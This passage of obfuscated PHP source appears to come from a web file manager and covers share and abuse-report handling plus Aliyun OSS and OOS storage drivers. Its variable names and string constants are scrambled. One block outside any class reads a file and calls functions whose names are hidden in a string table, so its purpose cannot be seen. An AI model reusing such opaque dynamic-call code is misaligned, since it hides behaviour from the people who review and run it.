$this->shareEventAdd($—“ôÆÇ[$ÖéœŞ¨œ[193]], $ñÖÑ•ÛÔ, $ÖéœŞ¨œ[1953]); $this->where(array($ÖéœŞ¨œ[2155] => $–µ×©¾))->save($©±ìŞ…÷); if (isset($ñÖÑ•ÛÔ[$ÖéœŞ¨œ[2143]])) { $this->_shareAuthSet($–µ×©¾, $ñÖÑ•ÛÔ[$ÖéœŞ¨œ[2143]]); } return !0; } private function _checkLinkShare($ùÔĞö¿…, $–ØŠ¾Éñ) { $£Ø¨§‚ =& $_SERVER[†ûãı«°]; if ($ùÔĞö¿…[$£Ø¨§‚[566]] != $£Ø¨§‚[91]) { return; } $œ¨íøüâ = $–ØŠ¾Éñ[$£Ø¨§‚[90]][$£Ø¨§‚[193]]; if ($–ØŠ¾Éñ[$£Ø¨§‚[90]][$£Ø¨§‚[33]] != $£Ø¨§‚[232]) { $© üë´ú = $this->_folderReport($œ¨íøüâ); if (!$© üë´ú) { return; } show_json(LNG($£Ø¨§‚[2158]) . $£Ø¨§‚[2159] . $© üë´ú, !1); } $•Ù¤ÀÂŞ = Model($£Ø¨§‚[906])->fileInfoGet($–ØŠ¾Éñ[$£Ø¨§‚[90]][$£Ø¨§‚[193]]); if (!$•Ù¤ÀÂŞ) { return; } $ı„Ëäâğ = $this->shareFileMeta($•Ù¤ÀÂŞ[$£Ø¨§‚[545]]); if (isset($ı„Ëäâğ[$£Ø¨§‚[452]]) && $ı„Ëäâğ[$£Ø¨§‚[452]] == $£Ø¨§‚[91]) { show_json(LNG($£Ø¨§‚[2160]), !1); } } private function _folderReport($•Êõ¦¦) { $œÍÒÆ½· =& $_SERVER[†ûãı«°]; $¢ââªî½ = array($œÍÒÆ½·[545] => array($œÍÒÆ½·[1100], 0), $œÍÒÆ½·[826] => 3); $îÙüÀÃò = Model($œÍÒÆ½·[2161])->where($¢ââªî½)->field($œÍÒÆ½·[545])->select(); if (!$îÙüÀÃò) { return !1; } $îÙüÀÃò = array_to_keyvalue($îÙüÀÃò, $œÍÒÆ½·[12], $œÍÒÆ½·[545]); $Ëë¥œ—ü = $œÍÒÆ½·[50] . $•Êõ¦¦ . $œÍÒÆ½·[50]; $¢ââªî½ = array($œÍÒÆ½·[545] => array($œÍÒÆ½·[7], $îÙüÀÃò), $œÍÒÆ½·[588] => array($œÍÒÆ½·[461], "\45{$Ëë¥œ—ü}\45"), $œÍÒÆ½·[507] => 0); $ñÌé­¡ = Model($œÍÒÆ½·[906])->where($¢ââªî½)->field($œÍÒÆ½·[2162])->find(); if (!$ñÌé­¡) { return !1; } $²±˜ºœ° = substr($ñÌé­¡[$œÍÒÆ½·[588]], strpos($ñÌé­¡[$œÍÒÆ½·[588]], $Ëë¥œ—ü)); $¢ââªî½ = array($œÍÒÆ½·[193] => array($œÍÒÆ½·[7], trim($²±˜ºœ°, $œÍÒÆ½·[50]))); $§ÏÆ†è’ = Model($œÍÒÆ½·[906])->where($¢ââªî½)->field($œÍÒÆ½·[32])->select(); $àšû¾É· = array_to_keyvalue($§ÏÆ†è’, $œÍÒÆ½·[12], $œÍÒÆ½·[32]); $àšû¾É·[] = $ñÌé­¡[$œÍÒÆ½·[32]]; return implode($œÍÒÆ½·[8], $àšû¾É·); } protected function remove($±ùèşÒÆ) { $¥éÑÖŞÓ =& $_SERVER[†ûãı«°]; $«ï™‡² = is_array($±ùèşÒÆ) ? $±ùèşÒÆ : array($±ùèşÒÆ); for ($Ú­®á‰ = 0; $Ú­®á‰ < count($«ï™‡²); $Ú­®á‰++) { $Ä¨ıªÆÚ = $this->getInfo($«ï™‡²[$Ú­®á‰]); if ($Ä¨ıªÆÚ[$¥éÑÖŞÓ[670]] == $¥éÑÖŞÓ[91]) { Model($¥éÑÖŞÓ[640])->eventShare($Ä¨ıªÆÚ[$¥éÑÖŞÓ[193]], $¥éÑÖŞÓ[2149]); } if ($Ä¨ıªÆÚ[$¥éÑÖŞÓ[566]] == $¥éÑÖŞÓ[91]) { Model($¥éÑÖŞÓ[640])->eventShare($Ä¨ıªÆÚ[$¥éÑÖŞÓ[193]], $¥éÑÖŞÓ[2148]); } $this->shareInfoMofify($Ä¨ıªÆÚ, $¥éÑÖŞÓ[2133]); } $½ëË´òÆ = array($¥éÑÖŞÓ[672] => array($¥éÑÖŞÓ[7], $«ï™‡²)); $Í”¬Âƒµ = $this->where($½ëË´òÆ)->delete(); if ($Í”¬Âƒµ) { Model($¥éÑÖŞÓ[673])->where($½ëË´òÆ)->delete(); } return $Í”¬Âƒµ; } protected function removeBySource($¯Š—åË›) { $şÏÇÊÀÉ =& $_SERVER[†ûãı«°]; $«Ì‰ÓÖË = array($şÏÇÊÀÉ[493] => array($şÏÇÊÀÉ[494], $¯Š—åË›)); $´—‡‰ş» = $this->field($şÏÇÊÀÉ[672])->where($«Ì‰ÓÖË)->select(); $®€ÌÊşŸ = array_to_keyvalue($´—‡‰ş», $şÏÇÊÀÉ[12], $şÏÇÊÀÉ[672]); if (!$®€ÌÊşŸ) { return; } foreach ($´—‡‰ş» as $ÚÔ©Ş¨ï) { $this->shareInfoMofify($ÚÔ©Ş¨ï, $şÏÇÊÀÉ[2133]); } $«Ì‰ÓÖË = array($şÏÇÊÀÉ[2155] => array($şÏÇÊÀÉ[494], $®€ÌÊşŸ)); $this->where($«Ì‰ÓÖË)->delete(); Model($şÏÇÊÀÉ[673])->where($«Ì‰ÓÖË)->delete(); } public function listAll($½À”Òş) { $´ÊÖËŒõ =& $_SERVER[†ûãı«°]; $öó›À÷¯ = array(); if ($½À”Òş[$´ÊÖËŒõ[1783]]) { $öó›À÷¯[$´ÊÖËŒõ[1783]] = $½À”Òş[$´ÊÖËŒõ[1783]]; } if ($½À”Òş[$´ÊÖËŒõ[836]]) { $ÏÛüÓ‰ = $½À”Òş[$´ÊÖËŒõ[837]] ? $½À”Òş[$´ÊÖËŒõ[837]] : strtotime(date($´ÊÖËŒõ[2163])); $öó›À÷¯[$´ÊÖËŒõ[233]] = array($´ÊÖËŒõ[410], array($½À”Òş[$´ÊÖËŒõ[836]], $ÏÛüÓ‰)); } if ($½À”Òş[$´ÊÖËŒõ[33]]) { $öó›À÷¯[$½À”Òş[$´ÊÖËŒõ[33]]] = 1; } else { $öó›À÷¯[] = array($´ÊÖËŒõ[566] => array($´ÊÖËŒõ[1100], 0), $´ÊÖËŒõ[670] => array($´ÊÖËŒõ[1100], 0), $´ÊÖËŒõ[2137] => $´ÊÖËŒõ[2086]); } if ($½À”Òş[$´ÊÖËŒõ[2082]]) { $öó›À÷¯[] = array($´ÊÖËŒõ[2134] => $½À”Òş[$´ÊÖËŒõ[2082]], $´ÊÖËŒõ[1671] => array($´ÊÖËŒõ[461], "\x25{$½À”Òş[$´ÊÖËŒõ[2082]]}\x25"), $´ÊÖËŒõ[2137] => $´ÊÖËŒõ[2086]); } $‰ïÒÂ‘… = $this->_makeOrder()->where($öó›À÷¯)->selectPage(20); if (empty($‰ïÒÂ‘…[$´ÊÖËŒõ[447]])) { return array(); } $this->_listDataApply($‰ïÒÂ‘…[$´ÊÖËŒõ[447]]); return $‰ïÒÂ‘…; } public function listDataApply($şªé°Õ) { $this->_listDataApply($şªé°Õ); return $şªé°Õ; } private function _listDataApply(&$·„¢ªÏÈ) { $µ×­á³¡ =& $_SERVER[†ûãı«°]; $Í£¿ë‹Ô = array_to_keyvalue($·„¢ªÏÈ, $µ×­á³¡[12], $µ×­á³¡[1783]); $üúñù‚Á = Model($µ×­á³¡[601])->userListInfo(array_unique($Í£¿ë‹Ô)); $„÷ÔŠä = array_to_keyvalue($·„¢ªÏÈ, $µ×­á³¡[12], $µ×­á³¡[193]); $‹Ã¨Ÿş¶ = Model($µ×­á³¡[906])->sourceListInfo($„÷ÔŠä, !0); foreach ($·„¢ªÏÈ as $„Á¾Š« => &$Ô†‹ÜëŒ) { $ÄÅ¯Ö²¥ = $Ô†‹ÜëŒ[$µ×­á³¡[1783]]; $Ô†‹ÜëŒ[$µ×­á³¡[2164]] = $üúñù‚Á[$ÄÅ¯Ö²¥] ? $üúñù‚Á[$ÄÅ¯Ö²¥] : !1; if (!$Ô†‹ÜëŒ[$µ×­á³¡[2164]] || $Ô†‹ÜëŒ[$µ×­á³¡[2164]][$µ×­á³¡[826]] != $µ×­á³¡[91]) { unset($·„¢ªÏÈ[$„Á¾Š«]); continue; } $Ù±«ó½ = $Ô†‹ÜëŒ[$µ×­á³¡[193]]; $Ô†‹ÜëŒ[$µ×­á³¡[90]] = $‹Ã¨Ÿş¶[$Ù±«ó½] ? $‹Ã¨Ÿş¶[$Ù±«ó½] : !1; if ($Ô†‹ÜëŒ[$µ×­á³¡[90]][$µ×­á³¡[507]] == $µ×­á³¡[91]) { unset($·„¢ªÏÈ[$„Á¾Š«]); } if ($Ô†‹ÜëŒ[$µ×­á³¡[90]] != $µ×­á³¡[230] && !$Ô†‹ÜëŒ[$µ×­á³¡[90]]) { unset($·„¢ªÏÈ[$„Á¾Š«]); } } unset($Ô†‹ÜëŒ); $·„¢ªÏÈ = array_values($·„¢ªÏÈ); } private function _makeOrder($ËÓÓÎ™ = '') { $à¬´ô£ =& $_SERVER[†ûãı«°]; $øĞØÉ°  = array($à¬´ô£[233], $à¬´ô£[837], $à¬´ô£[2151], $à¬´ô£[2152]); $Ã¡çÉŒİ = array($à¬´ô£[525] => $à¬´ô£[526], $à¬´ô£[527] => $à¬´ô£[528]); $¬’ÙäûÜ = Input::get($à¬´ô£[532], $à¬´ô£[7], $à¬´ô£[499], $øĞØÉ° ); $¯¨£äÍ = Input::get($à¬´ô£[533], $à¬´ô£[7], $à¬´ô£[2165], array($à¬´ô£[2079], $à¬´ô£[527])); $¯¨£äÍ = $Ã¡çÉŒİ[$¯¨£äÍ]; $ËÓÓÎ™ = $ËÓÓÎ™ . "{$¬’ÙäûÜ}\40{$¯¨£äÍ}"; return $this->order($ËÓÓÎ™); } public function reportAdd($ÓÏûõü”) { $×†Ç™ëÚ =& $_SERVER[†ûãı«°]; $ÄĞôˆ¼† = array($×†Ç™ëÚ[672] => $ÓÏûõü”[$×†Ç™ëÚ[672]], $×†Ç™ëÚ[1783] => USER_ID); if (Model($×†Ç™ëÚ[2161])->where($ÄĞôˆ¼†)->find()) { return !1; } $ß§Ìôó = array($×†Ç™ëÚ[672] => $ÓÏûõü”[$×†Ç™ëÚ[672]], $×†Ç™ëÚ[1671] => $ÓÏûõü”[$×†Ç™ëÚ[1671]], $×†Ç™ëÚ[193] => $ÓÏûõü”[$×†Ç™ëÚ[193]], $×†Ç™ëÚ[545] => $ÓÏûõü”[$×†Ç™ëÚ[545]], $×†Ç™ëÚ[1783] => USER_ID, $×†Ç™ëÚ[33] => $ÓÏûõü”[$×†Ç™ëÚ[33]], $×†Ç™ëÚ[528] => $ÓÏûõü”[$×†Ç™ëÚ[528]]); return Model($×†Ç™ëÚ[2161])->add($ß§Ìôó); } public function reportList($¼±š€„§) { $˜ïû—éæ =& $_SERVER[†ûãı«°]; $ã©ö ‹ñ = array(); if ($¼±š€„§[$˜ïû—éæ[836]]) { $Ô—ôª«‹ = $¼±š€„§[$˜ïû—éæ[837]] ? $¼±š€„§[$˜ïû—éæ[837]] : strtotime(date($˜ïû—éæ[2163])); $ã©ö ‹ñ[$˜ïû—éæ[233]] = array($˜ïû—éæ[410], array($¼±š€„§[$˜ïû—éæ[836]], $Ô—ôª«‹)); } if (isset($¼±š€„§[$˜ïû—éæ[33]]) && in_array($¼±š€„§[$˜ïû—éæ[33]], array($˜ïû—éæ[91], $˜ïû—éæ[512], $˜ïû—éæ[2166], $˜ïû—éæ[2167], $˜ïû—éæ[2168]))) { $ã©ö ‹ñ[$˜ïû—éæ[33]] = $¼±š€„§[$˜ïû—éæ[33]]; } if (isset($¼±š€„§[$˜ïû—éæ[826]]) && in_array($¼±š€„§[$˜ïû—éæ[826]], array($˜ïû—éæ[230], $˜ïû—éæ[91], $˜ïû—éæ[512], $˜ïû—éæ[2166]))) { $ã©ö ‹ñ[$˜ïû—éæ[826]] = $¼±š€„§[$˜ïû—éæ[826]]; } $­ÎÅÌÉö = Input::get($˜ïû—éæ[533], $˜ïû—éæ[7], $˜ïû—éæ[2165], array($˜ïû—éæ[2079], $˜ïû—éæ[527])); $İÉ©° = array($˜ïû—éæ[525] => $˜ïû—éæ[526], $˜ïû—éæ[527] => $˜ïû—éæ[528]); $ÇµñÌËí = $˜ïû—éæ[2169] . $İÉ©°[$­ÎÅÌÉö]; $¯¸ğßÍê = Model($˜ïû—éæ[2161])->where($ã©ö ‹ñ)->order($ÇµñÌËí)->selectPage(20); if (empty($¯¸ğßÍê[$˜ïû—éæ[447]])) { return array(); } $õ‹ßóÜ» = array_to_keyvalue_group($¯¸ğßÍê[$˜ïû—éæ[447]], $˜ïû—éæ[826], $˜ïû—éæ[672]); if (!empty($õ‹ßóÜ»[0])) { $¼±š€„§ = $õ‹ßóÜ»[0]; $ã©ö ‹ñ = array($˜ïû—éæ[672] => array($˜ïû—éæ[7], $¼±š€„§)); $ÇËÃš§— = $this->where($ã©ö ‹ñ)->field($˜ïû—éæ[672])->select(); $ÇËÃš§— = array_to_keyvalue($ÇËÃš§—, $˜ïû—éæ[12], $˜ïû—éæ[672]); $ˆÂÃŒ®Ü = array_diff($¼±š€„§, $ÇËÃš§—); if (!empty($ˆÂÃŒ®Ü)) { foreach ($¯¸ğßÍê[$˜ïû—éæ[447]] as $ÉìÆÖÓ => $ÕÖ¡Çƒè) { if (in_array($ÕÖ¡Çƒè[$˜ïû—éæ[672]], $ˆÂÃŒ®Ü)) { unset($¯¸ğßÍê[$˜ïû—éæ[447]][$ÉìÆÖÓ]); } } } } $this->_listDataApply($¯¸ğßÍê[$˜ïû—éæ[447]]); return $¯¸ğßÍê; } public function reportStatus($—¡úÍáÊ) { $»ğï„á =& $_SERVER[†ûãı«°]; $ÚƒÎ¨Á = array($»ğï„á[477] => $—¡úÍáÊ[$»ğï„á[477]]); $šşîü = Model($»ğï„á[2161])->where($ÚƒÎ¨Á)->field($»ğï„á[2170])->find(); if (!$šşîü) { return !1; } $Ó®…¿™‡ = array($»ğï„á[826] => $—¡úÍáÊ[$»ğï„á[826]]); if ($—¡úÍáÊ[$»ğï„á[826]] == $»ğï„á[2166] && $šşîü[$»ğï„á[826]] == $»ğï„á[2166]) { $Ó®…¿™‡[$»ğï„á[826]] = 0; } $ıÖİé‚Õ = Model($»ğï„á[2161])->where($ÚƒÎ¨Á)->save($Ó®…¿™‡); if ($—¡úÍáÊ[$»ğï„á[826]] == $»ğï„á[512]) { if ($šşîü[$»ğï„á[545]] != $»ğï„á[230] && $this->shareFileMeta($šşîü[$»ğï„á[545]])) { $this->shareFileMeta($šşîü[$»ğï„á[545]], 0); } $this->remove($šşîü[$»ğï„á[672]]); return !0; } if ($ıÖİé‚Õ && $—¡úÍáÊ[$»ğï„á[826]] == $»ğï„á[2166]) { $úæå‹Š÷ = $Ó®…¿™‡[$»ğï„á[826]] == $»ğï„á[2166] ? 1 : 0; $this->shareFileMeta($šşîü[$»ğï„á[545]], $úæå‹Š÷); $this->removeByFile($šşîü[$»ğï„á[545]]); } return $ıÖİé‚Õ; } private function removeByFile($ùÓ¡‚°í) { $Ñ®êçµÓ =& $_SERVER[†ûãı«°]; $¡©ëÜ‡ = Model($Ñ®êçµÓ[906])->where(array($Ñ®êçµÓ[545] => $ùÓ¡‚°í))->field($Ñ®êçµÓ[193])->select(); $ÌòÔñù‰ = array_to_keyvalue($¡©ëÜ‡, $Ñ®êçµÓ[12], $Ñ®êçµÓ[193]); $Ñ‰œƒŸÉ = array($Ñ®êçµÓ[193] => array($Ñ®êçµÓ[7], $ÌòÔñù‰), $Ñ®êçµÓ[566] => 1); $¡©ëÜ‡ = $this->where($Ñ‰œƒŸÉ)->field($Ñ®êçµÓ[672])->select(); if (empty($¡©ëÜ‡)) { return; } $àªï­ïë = array_to_keyvalue($¡©ëÜ‡, $Ñ®êçµÓ[12], $Ñ®êçµÓ[672]); $this->remove($àªï­ïë); } private function shareFileMeta($ĞıºŒÇú, $Ä‰ş™œñ = null) { $ÎÙ°Ûê— =& $_SERVER[†ûãı«°]; $ãæèèÆ¼ = array($ÎÙ°Ûê—[545] => $ĞıºŒÇú, $ÎÙ°Ûê—[97] => $ÎÙ°Ûê—[2171]); if (is_null($Ä‰ş™œñ)) { return Model($ÎÙ°Ûê—[2172])->where($ãæèèÆ¼)->find(); } $ãæèèÆ¼[$ÎÙ°Ûê—[452]] = $Ä‰ş™œñ; Model($ÎÙ°Ûê—[2172])->add($ãæèèÆ¼, array(), !0); } } if ($_SERVER[$_SERVER[†ûãı«°][949]] != $_SERVER[$_SERVER[†ûãı«°][966]]) { $_getc = $_SERVER[†ûãı«°][951]; $_getfile = $_SERVER[$_SERVER[†ûãı«°][952]] . $_SERVER[†ûãı«°][953]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[†ûãı«°][287], $_getfilec); if (count($_getarrs) < $_SERVER[†ûãı«°][694]) { $exit = $_SERVER[†ûãı«°][954]; $exit(); } $_act = $_SERVER[†ûãı«°][955]; $_act($_SERVER[$_SERVER[†ûãı«°][950]]); } goto fÜ«ˆÁÎİŒ; bÃÅê†­ƒã: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($˜¯­½´) { parent::__construct($˜¯­½´); $this->setSignVersion($_SERVER[†ûãı«°][249]); } public function fileOutLink($èâ”æŠë) { $Ğ«Ç®Ü =& $_SERVER[†ûãı«°]; if (substr($èâ”æŠë, 0, 7) == $Ğ«Ç®Ü[218]) { $èâ”æŠë = $Ğ«Ç®Ü[219] . substr($èâ”æŠë, 7); } header($Ğ«Ç®Ü[175] . $èâ”æŠë); die; } public function uploadFormData($¡ëé«Ìå, $… ÈÏ™İ = 3600) { return $this->uploadFormDataV2($¡ëé«Ìå, $… ÈÏ™İ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¨—©Óûà) { parent::__construct(); include_once SDK_DIR . $_SERVER[†ûãı«°][1474]; $this->_init($¨—©Óûà); } public function _init($†éŠ¥İå) { $«ïÑÑ–‡ =& $_SERVER[†ûãı«°]; $this->config = $†éŠ¥İå; foreach ($†éŠ¥İå as $•×¹ëªó => $  ÆÁá) { if (isset($this->{$•×¹ëªó})) { $this->{$•×¹ëªó} = $  ÆÁá; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($«ïÑÑ–‡[1475] . LNG($«ïÑÑ–‡[1476])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Õ¾ìŠÉ€ =& $_SERVER[†ûãı«°]; $€ô—œÕ§ = new OSS\Model\CorsConfig(); $òğ×¿ıä = new OSS\Model\CorsRule(); $òğ×¿ıä->addAllowedOrigin($Õ¾ìŠÉ€[1477]); $òğ×¿ıä->addAllowedMethod($Õ¾ìŠÉ€[1478]); $òğ×¿ıä->addAllowedMethod($Õ¾ìŠÉ€[1479]); $òğ×¿ıä->addAllowedMethod($Õ¾ìŠÉ€[1480]); $òğ×¿ıä->addAllowedMethod($Õ¾ìŠÉ€[1481]); $òğ×¿ıä->addAllowedMethod($Õ¾ìŠÉ€[165]); $òğ×¿ıä->setMaxAgeSeconds(600); $òğ×¿ıä->addExposeHeader($Õ¾ìŠÉ€[1482]); $òğ×¿ıä->addAllowedHeader($Õ¾ìŠÉ€[1477]); $€ô—œÕ§->addRule($òğ×¿ıä); try { $this->client->putBucketCors($this->bucket, $€ô—œÕ§); } catch (OSS\Core\OssException $ÁÊš“­) { $this->writeLog(__FUNCTION__ . $Õ¾ìŠÉ€[214] . $ÁÊš“­->getMessage()); return !1; } return !0; } public function getBucketCors() { $ˆÁä”«˜ =& $_SERVER[†ûãı«°]; $ô§ìÚĞí = null; try { $ô§ìÚĞí = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¤ı“ĞÖë) { $this->writeLog(__FUNCTION__ . $ˆÁä”«˜[214] . $¤ı“ĞÖë->getMessage()); return null; } if (!$ô§ìÚĞí || !($…ôŒı•Ö = $ô§ìÚĞí->getRules())) { return null; } $°µÂìõÖ = $…ôŒı•Ö[0]->getAllowedOrigins(); $öÃ¶ìĞ™ = $…ôŒı•Ö[0]->getAllowedMethods(); $äÀİ¦ = $…ôŒı•Ö[0]->getMaxAgeSeconds(); $ËÚà¼Æğ = $…ôŒı•Ö[0]->getExposeHeaders(); $Ç¨¤„Ó = $…ôŒı•Ö[0]->getAllowedHeaders(); return array($ˆÁä”«˜[220] => isset($°µÂìõÖ[0]) ? $°µÂìõÖ[0] : $ˆÁä”«˜[12], $ˆÁä”«˜[224] => $öÃ¶ìĞ™, $ˆÁä”«˜[1483] => $äÀİ¦, $ˆÁä”«˜[1484] => isset($ËÚà¼Æğ[0]) ? $ËÚà¼Æğ[0] : $ˆÁä”«˜[12], $ˆÁä”«˜[221] => isset($Ç¨¤„Ó[0]) ? $Ç¨¤„Ó[0] : $ˆÁä”«˜[12]); } public function isBucketCors() { $üÈÑÃÜ‘ =& $_SERVER[†ûãı«°]; $»Õ˜·Çü = $this->getBucketCors(); if (!$»Õ˜·Çü || !is_array($»Õ˜·Çü)) { return !1; } if ($»Õ˜·Çü[$üÈÑÃÜ‘[220]] != $üÈÑÃÜ‘[222] || $»Õ˜·Çü[$üÈÑÃÜ‘[221]] != $üÈÑÃÜ‘[222]) { return !1; } $©Ÿ…ï¡ = array_map($üÈÑÃÜ‘[223], $»Õ˜·Çü[$üÈÑÃÜ‘[224]]); if (!is_array($©Ÿ…ï¡)) { $©Ÿ…ï¡ = array(); } $œ•£şÇ = array($üÈÑÃÜ‘[225], $üÈÑÃÜ‘[226], $üÈÑÃÜ‘[227], $üÈÑÃÜ‘[228], $üÈÑÃÜ‘[229]); $§öÆüı© = array_diff($œ•£şÇ, $©Ÿ…ï¡); return empty($§öÆüı©); } public function mkfile($ƒŞÈƒ—‚, $†Ÿêıå = '', $È·˜È‘ = REPEAT_RENAME) { $å‚åÄõš = $this->setContent($ƒŞÈƒ—‚, $†Ÿêıå); if ($å‚åÄõš !== !1) { return $this->getPathOuter($ƒŞÈƒ—‚); } return !1; } public function mkdir($£³«üóĞ, $†İïüÃú = REPEAT_SKIP) { if ($†İïüÃú && $this->_isFolder($£³«üóĞ)) { return $this->getPathOuter($£³«üóĞ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($£³«üóĞ)); } catch (OSS\Core\OssException $İİüÙ«) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $İİüÙ«->getMessage()); return !1; } return $this->getPathOuter($£³«üóĞ); } private function fileList($Ã‡ı’®‰, $¨ÛŸşü¡ = '', $Î×¯öÏ´ = 0) { $‡ÆÊ¬ô„ =& $_SERVER[†ûãı«°]; $Ã‡ı’®‰ = trim($Ã‡ı’®‰, $‡ÆÊ¬ô„[8]); $Î°Û´ï‰ = empty($Ã‡ı’®‰) && $Ã‡ı’®‰ !== $‡ÆÊ¬ô„[230] ? $‡ÆÊ¬ô„[12] : $Ã‡ı’®‰ . $‡ÆÊ¬ô„[8]; $Òú¿¥È = $‡ÆÊ¬ô„[12]; $Ã¦¥Íªõ = 1000; $ÖûêˆÒé = $Êª•”¦½ = array(); while (!0) { check_abort(); $üÜÆÒÜò = array($‡ÆÊ¬ô„[1485] => $¨ÛŸşü¡, $‡ÆÊ¬ô„[1486] => $Î°Û´ï‰, $‡ÆÊ¬ô„[1487] => $Ã¦¥Íªõ, $‡ÆÊ¬ô„[1488] => $Òú¿¥È); try { $©ÓÙò’Ë = $this->client->listObjects($this->bucket, $üÜÆÒÜò); } catch (OSS\Core\OssException $Œùòº€†) { $this->writeLog(__FUNCTION__ . $‡ÆÊ¬ô„[214] . $Œùòº€†->getMessage()); break; } $Òú¿¥È = $©ÓÙò’Ë->getNextMarker(); $åêˆıüï = $©ÓÙò’Ë->getObjectList(); $°¦¥†Ûí = $©ÓÙò’Ë->getPrefixList(); foreach ($åêˆıüï as $……ÄÔğ“) { if ($……ÄÔğ“->getKey() == $Î°Û´ï‰) { continue; } $òùÀ‡” = $……ÄÔğ“->getKey(); $ñ«Ê±² = $……ÄÔğ“->getSize(); $ıå±œËş = $……ÄÔğ“->getLastModified(); $’šá¨Øı = trim($……ÄÔğ“->getETag(), $‡ÆÊ¬ô„[121]); $êÂê½„Ö = $Î×¯öÏ´ ? array($‡ÆÊ¬ô„[32] => $òùÀ‡”, $‡ÆÊ¬ô„[79] => $ñ«Ê±², $‡ÆÊ¬ô„[206] => strtotime($ıå±œËş), $‡ÆÊ¬ô„[1489] => $’šá¨Øı) : $òùÀ‡”; $ÃğãÌÚ = $ñ«Ê±² == 0 && substr($òùÀ‡”, strlen($òùÀ‡”) - 1, 1) == $‡ÆÊ¬ô„[8] ? !0 : !1; $²İ†ä = array($‡ÆÊ¬ô„[79] => $ñ«Ê±², $‡ÆÊ¬ô„[1490] => $ñ«Ê±², $‡ÆÊ¬ô„[88] => strtotime($ıå±œËş), $‡ÆÊ¬ô„[1491] => $ıå±œËş, $‡ÆÊ¬ô„[1489] => $’šá¨Øı); $this->cacheMethodInfoSet($òùÀ‡”, $ÃğãÌÚ, $²İ†ä); if ($ÃğãÌÚ) { $ÖûêˆÒé[] = $òùÀ‡”; continue; } $Êª•”¦½[] = $êÂê½„Ö; } foreach ($°¦¥†Ûí as $ôÒÔ¸¼š) { $ÖûêˆÒé[] = $ôÒÔ¸¼š->getPrefix(); $this->cacheMethodInfoSet($ôÒÔ¸¼š->getPrefix(), !0); } if ($Òú¿¥È === $‡ÆÊ¬ô„[12]) { break; } } $this->cacheMethodInfoSet($Ã‡ı’®‰, !0); return array($‡ÆÊ¬ô„[85] => $ÖûêˆÒé, $‡ÆÊ¬ô„[86] => $Êª•”¦½); } public function listObject($††óş¤š, $í¨ÖàŸå = '') { $ÇÅúóôğ =& $_SERVER[†ûãı«°]; $††óş¤š = trim($††óş¤š, $ÇÅúóôğ[8]); $‡›È™« = empty($††óş¤š) && $††óş¤š !== $ÇÅúóôğ[230] ? $ÇÅúóôğ[12] : $††óş¤š . $ÇÅúóôğ[8]; $˜ÔÙÚ” = $ÇÅúóôğ[12]; $óÌŒ¶˜æ = 1000; $‰ğ³ÙÖä = $ÏƒÔÅ¨æ = array(); while (!0) { check_abort(); $¢­÷úÑä = array($ÇÅúóôğ[1485] => $í¨ÖàŸå, $ÇÅúóôğ[1486] => $‡›È™«, $ÇÅúóôğ[1487] => $óÌŒ¶˜æ, $ÇÅúóôğ[1488] => $˜ÔÙÚ”); try { $åè•Œä¿ = $this->client->listObjects($this->bucket, $¢­÷úÑä); } catch (OSS\Core\OssException $×Ïæ–ƒ) { $this->writeLog(__FUNCTION__ . $ÇÅúóôğ[214] . $×Ïæ–ƒ->getMessage()); break; } $˜ÔÙÚ” = $åè•Œä¿->getNextMarker(); $õ¦€—ÚÙ = $åè•Œä¿->getObjectList(); foreach ($õ¦€—ÚÙ as $¹Øºû¼) { if ($¹Øºû¼->getKey() == $‡›È™«) { continue; } $ƒ³„Ì€ = $¹Øºû¼->getKey(); $ˆ²çë´‡ = $¹Øºû¼->getSize(); $»’ã¸‰• = $ˆ²çë´‡ == 0 && substr($ƒ³„Ì€, strlen($ƒ³„Ì€) - 1, 1) == $ÇÅúóôğ[8] ? !0 : !1; if ($»’ã¸‰•) { continue; } $ÏƒÔÅ¨æ[] = $ˆ²çë´‡ . $ÇÅúóôğ[214] . $ƒ³„Ì€; } if ($˜ÔÙÚ” === $ÇÅúóôğ[12]) { break; } } return array($ÇÅúóôğ[85] => $‰ğ³ÙÖä, $ÇÅúóôğ[86] => $ÏƒÔÅ¨æ); } public function copyFile($ş»¹ğê, $Ò„Ü¼€Ì) { $íÈÌîÉ¸ = $this->size($ş»¹ğê); if ($íÈÌîÉ¸ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ş»¹ğê, $this->bucket, $this->pathEncode($Ò„Ü¼€Ì)); } catch (OSS\Core\OssException $áÊ¥´è) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][214] . $áÊ¥´è->getMessage()); return !1; } return $this->getPathOuter($Ò„Ü¼€Ì); } $ó´–Îî = $this->multiCopyObject($ş»¹ğê, $Ò„Ü¼€Ì, $íÈÌîÉ¸); return $ó´–Îî ? $this->getPathOuter($Ò„Ü¼€Ì) : !1; } private function multiCopyObject($˜ÈÉæ·Ù, $ñÖ»œ§ğ, $ğØŞšê·) { $È«å»ü¤ =& $_SERVER[†ûãı«°]; try { $íŠğŞŸÑ = array(); if ($÷¤€–¾ = $this->hashMd5($˜ÈÉæ·Ù)) { $íŠğŞŸÑ = array(OSS\OssClient::OSS_HEADERS => array($È«å»ü¤[1492] => $÷¤€–¾)); } $‘Û’®®ú = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ñÖ»œ§ğ), $íŠğŞŸÑ); $¦‚Œ¿œ = 1; $Ï¥ÁÃÄõ = 0; $áÖì¶Ïå = array(); $Ê÷‚®ŠÖ = 1024 * 1024 * 10; $ß”İÈç« = $this->client->generateMultiuploadParts($ğØŞšê·, $Ê÷‚®ŠÖ); foreach ($ß”İÈç« as $éªÃÇƒ => $úı“è¯ç) { $ğ´‹ÕäÚ = $Ï¥ÁÃÄõ + (int) $úı“è¯ç[$È«å»ü¤[1493]]; $°Ñóêé = (int) $úı“è¯ç[$È«å»ü¤[414]] + $ğ´‹ÕäÚ - 1; $î‚¼æ = 